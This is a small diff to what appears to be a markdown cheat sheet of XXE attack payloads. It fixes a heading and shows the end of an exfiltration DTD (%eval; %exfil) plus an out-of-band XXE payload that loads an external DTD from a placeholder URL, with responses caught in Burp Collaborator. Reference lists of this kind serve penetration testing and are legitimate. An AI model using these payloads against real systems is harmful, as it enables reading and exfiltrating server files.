@@ -66,7 +66,7 @@ malicious.dtd
 %eval;
 %exfil
 ```
-### ### Error based XXE with parameter entity(out of band)[Recieving response on burp collobarotor]
+### Error based XXE with parameter entity(out of band)[Recieving response on burp collobarotor]
 ```xml
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
 ```
